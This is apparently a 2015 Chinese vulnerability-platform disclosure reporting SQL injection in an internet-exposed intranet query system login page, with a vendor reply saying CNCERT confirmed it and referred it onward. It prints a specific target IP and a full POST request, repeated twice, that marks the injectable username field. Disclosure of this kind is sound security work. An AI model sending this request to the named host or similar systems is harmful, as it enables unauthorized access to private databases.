wybug_title: GS内网某查询系统暴露导致内网高危SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-01-19：	细节已通知厂商并且等待厂商处理中									2015-01-22：	厂商已经确认，细节仅向厂商公开									2015-02-01：	细节向核心白帽子及相关领域专家公开									2015-02-11：	细节向普通白帽子公开									2015-02-21：	细节向实习白帽子公开									2015-03-05：	细节向公众公开  简要描述： GS内网某查询系统暴露导致内网高危SQL注入漏洞  详细说明：  查询系统暴露在公网地址下
http://222.51.224.76/QueryWebs/Account/Login.aspx
POST注入：
POST /QueryWebs/Account/Login.aspx HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://222.51.224.76/QueryWebs/Account/Login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 222.51.224.76Content-Length: 466Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=waoazj3qkbj31fogckhrg0zl__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIxMTU5ODQzOQ9kFgJmD2QWAgIDD2QWBAIFDxYCHgdWaXNpYmxlaGQCCw9kFgICAQ8PFgIeBFRleHQFDjIyMi45MS4xMjUuMTA2ZGRkrhK%2BeIFWtJD4wpeFddwtuSO9EcQb3XLPAq9J8KuPHGs%3D&__VIEWSTATEGENERATOR=E67C8165&__EVENTVALIDATION=%2FwEWBALozerzAwLM%2F%2FiZCQLDx7adCALv8O2RCq6hnxNGcZsSmSVaxG6xjX%2B6P9ABeyweuzsLFUoGg0CS&ctl00%24MainContent%24UserName=asd*&ctl00%24MainContent%24Password=asd&ctl00%24MainContent%24LoginButton=%E7%99%BB%E5%BD%95
全内网数据库泄漏

   漏洞证明：  查询系统暴露在公网地址下
http://222.51.224.76/QueryWebs/Account/Login.aspx
POST注入：
POST /QueryWebs/Account/Login.aspx HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*Referer: http://222.51.224.76/QueryWebs/Account/Login.aspxAccept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 222.51.224.76Content-Length: 466Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=waoazj3qkbj31fogckhrg0zl__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIxMTU5ODQzOQ9kFgJmD2QWAgIDD2QWBAIFDxYCHgdWaXNpYmxlaGQCCw9kFgICAQ8PFgIeBFRleHQFDjIyMi45MS4xMjUuMTA2ZGRkrhK%2BeIFWtJD4wpeFddwtuSO9EcQb3XLPAq9J8KuPHGs%3D&__VIEWSTATEGENERATOR=E67C8165&__EVENTVALIDATION=%2FwEWBALozerzAwLM%2F%2FiZCQLDx7adCALv8O2RCq6hnxNGcZsSmSVaxG6xjX%2B6P9ABeyweuzsLFUoGg0CS&ctl00%24MainContent%24UserName=asd*&ctl00%24MainContent%24Password=asd&ctl00%24MainContent%24LoginButton=%E7%99%BB%E5%BD%95

wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-01-22 17:35 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给湖南分中心，由湖南分中心后续协调网站管理单位处置。 最新状态： 暂无
